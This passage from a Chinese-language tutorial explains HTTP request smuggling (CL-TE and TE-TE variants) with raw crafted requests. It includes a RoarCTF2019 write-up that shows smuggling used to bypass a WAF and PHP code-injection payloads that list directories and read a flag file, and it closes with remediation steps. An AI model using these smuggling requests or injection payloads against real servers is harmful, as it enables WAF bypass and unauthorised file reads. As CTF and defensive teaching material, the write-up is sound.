    \r\n
    12\r\n
    aPOST / HTTP/1.1\r\n
    \r\n
    0\r\n
    \r\n
**攻击流程** ：  
前端服务器处理`Transfer-Encoding`，当其读取到
    0\r\n
    \r\n
认为是读取完毕了。  
此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理`Content-Length`请求头，因为请求体的长度为`4`.也就是当它读取完
    12\r\n
就认为这个请求已经结束了。后面的数据就认为是另一个请求：
    aPOST / HTTP/1.1\r\n
    \r\n
    0\r\n
    \r\n
成功报错，造成HTTP请求走私。
#### TE-TE
TE-TE，当收到存在两个请求头的请求包时，前后端服务器都处理`Transfer-Encoding`请求头，确实是实现了RFC的标准。不过前后端服务器不是同一种。这就有了一种方法，我们可以对发送的请求包中的`Transfer-Encoding`进行某种混淆操作(如某个字符改变大小写)，从而使其中一个服务器不处理`Transfer-Encoding`请求头。在某种意义上这还是`CL-TE`或者`TE-CL`。  
**构造请求示例** ：
    POST / HTTP/1.1\r\n
    Host: test.com\r\n
    ......
    Content-length: 4\r\n
    Transfer-Encoding: chunked\r\n
    Transfer-encoding: cow\r\n
    \r\n
    5c\r\n
    aPOST / HTTP/1.1\r\n
    Content-Type: application/x-www-form-urlencoded\r\n
    Content-Length: 15\r\n
    \r\n
    x=1\r\n
    0\r\n
    \r\n
**攻击流程** ：  
前端服务器处理`Transfer-Encoding`，当其读取到
    0\r\n
    \r\n
认为是读取结束。  
此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器处理`Transfer-encoding`请求头，将`Transfer-Encoding`隐藏在服务端的一个`chain`中时，它将会回退到使用`Content-Length`去发送请求。读取到
    5c\r\n
认为是读取完毕了。后面的数据就认为是另一个请求：
    aPOST / HTTP/1.1\r\n
    Content-Type: application/x-www-form-urlencoded\r\n
    Content-Length: 15\r\n
    \r\n
    x=1\r\n
    0\r\n
    \r\n
成功报错，造成HTTP请求走私。
### 0x05 HTTP请求走私实战
在我学HTTP请求走私之前，正是因为碰到一道Web题要使用HTTP请求走私。现在复现一下
#### RoarCTF2019-Web：easy_calc
进去发现是个计算器  
这道题是国赛的love_math的修改版。国赛题`love_math`参考Smi1e师傅的Writeup：[国赛love_math题解](https://www.smi1e.top/%E5%9B%BD%E8%B5%9Blove_math%E9%A2%98%E8%A7%A3/)  
输入`calc.php`，发现了网站源码  
这道题除去了长度限制，payload中不能包含
> ' ', '\t', '\r', '\n',''', '"', '`', '[', ']'等字符
师傅的Writeup还说网站加了waf，需要绕过waf。所以还需要绕过waf，测试发现当我们提交一些字符时，会直接`403`。`403`？！应该就是走私报错了，经测试发现的确存在服务器存在http走私漏洞，可以用来绕waf。
因禁了一些字符，所以不能直接getflag，需要继续分析payload构造。
##### 相关PHP函数
**scandir() 函数**  
返回指定目录中的文件和目录的数组。  
**base_convert() 函数**  
在任意进制之间转换数字。  
**dechex() 函数** ：把十进制转换为十六进制。  
**hex2bin() 函数** ：把十六进制值的字符串转换为 ASCII 字符。  
**readfile() 函数**  
输出一个文件。  
该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile()
形式调用该函数，来隐藏错误信息。  
##### HTTP走私绕过WAF
**测试示例**  
_1、HTTP请求走私测试2(CL-CL漏洞)_  
两个CL直接导致前端转发的服务器400，而且完整转发了post包给后端。  
_2、HTTP请求走私测试1(CL-TE漏洞)_  
CL和TE直接导致前端转发的服务器400，而且完整转发了post包给后端。  
其它几种请求走私依旧可以，就不测试了。
**构造payload获得Flag**  
使用`scandir()函数`、`readfile()函数`、`base_convert()函数`、`dechex() 函数`、`hex2bin()
函数`（`chr()函数`）  
36进制`scandir`->10进制61693386291  
36进制`readfile`->10进制2146934604002  
ascii码`/`->16进制2f->10进制47  
36进制f1agg->10进制25254448(读取根目录得到的)  
_1、列目录_  
首先要使用`scandir()函数`，尝试构造payload列举根目录下的文件。  
`scandir()`可以用`base_convert()函数`构造，但是利用`base_convert()`只能解决`a~z`的利用。  
因为根目录需要`/`符号，且不在`a~z`,所以需要`hex2bin(dechex(47))`这种构造方式，`dechex()
函数`把十进制数转换为十六进制数。`hex2bin() 函数`把十六进制值的字符串转换为 ASCII 字符。当然，也可以直接用`chr()函数`
payload
    var_dump(base_convert(61693386291,10,36)(chr(47)))
_2、读取flag_
payload
    var_dump(base_convert(2146934604002,10,36)(chr(47).base_convert(25254448,10,36)))
##### PHP字符串解析特性绕过WAF
输入时发现num只能输入数字，输入字符无法解析。  
这里可以利用php的字符串解析特性绕过bypass：[利用PHP的字符串解析特性Bypass](https://www.freebuf.com/articles/web/213359.html)
> PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：  
>  1.删除空白符  
>  2.将某些字符转换为下划线（包括空格）
所以我们可以在num前加个空格绕过waf
    http://www.xxx.com/index.php? num=aaaa
现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样代码还能正常运行，还上传了非法字符。  
然后再利用`scandir()`函数，列出 `参数目录` 中的文件和目录。  
首先，要先扫根目录下的所有文件，也就是是`scandir("/")`,因为`/`被过滤了，所以直接用`chr(“47”)`绕过。  
发现`flagg文件`  
然后再去读取这个文件就行了。payload：
    calc.php? num=1;var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
### 0x06 漏洞修复
1、将前端服务器配置为只使用HTTP/2与后端系统通信  
2、完全禁用后端连接重用来解决此漏洞的所有变体  
3、确保连接中的所有服务器运行具有相同配置的相同web服务器软件。  
4、彻底拒绝模糊的请求，并删除关联的连接。  
5、在Burp Suite中，你可以使用Repeater菜单禁用此行为，确保你选择的工具具有相同的功能。  
6、通过Squid之类的代理来测试他们的测试人员的流量以进行监控。破坏测试人员发起的任何走私攻击请求，确保对此漏洞做到全面杜绝。
### 0x07 写在后面
这次又学到了新的知识-HTTP请求走私。了解了HTTP请求走私的五种方式，以及一些PHP函数的使用。HTTP请求走私属于协议层攻击，是服务器漏洞的一种，应予以注意。